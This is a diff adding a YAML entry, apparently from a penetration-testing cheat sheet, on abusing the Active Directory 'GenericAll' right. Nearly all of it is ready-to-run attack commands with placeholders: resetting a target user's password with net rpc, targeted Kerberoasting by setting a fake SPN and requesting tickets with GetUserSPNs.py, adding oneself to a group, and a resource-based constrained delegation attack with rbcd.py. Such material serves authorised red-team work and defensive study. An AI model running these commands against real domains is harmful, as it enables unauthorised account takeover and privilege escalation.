@@ -1,0 +1,17 @@
+name: GenericAll
+description: Full control - can modify object, reset password, or add to group
+commands:
+- '# On User: Reset password'
+- net rpc password '<TARGET_USER>' 'NewPassword123!' -U '<DOMAIN>/<YOUR_USER>%<YOUR_PASSWORD>' -S <DC_IP>
+- ''
+- '# On User: Targeted Kerberoasting (set SPN)'
+- setspn -a <FAKE_SPN> <TARGET_USER>
+- GetUserSPNs.py -request -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASSWORD>'
+- ''
+- '# On Group: Add yourself'
+- net rpc group addmem '<GROUP>' '<YOUR_USER>' -U '<DOMAIN>/<YOUR_USER>%<YOUR_PASSWORD>' -S <DC_IP>
+- ''
+- '# On Computer: RBCD attack'
+- rbcd.py -delegate-to '<TARGET$>' -delegate-from '<YOUR_COMPUTER$>' '<DOMAIN>/<USER>:<PASSWORD>'
+opsec: []
+references: []
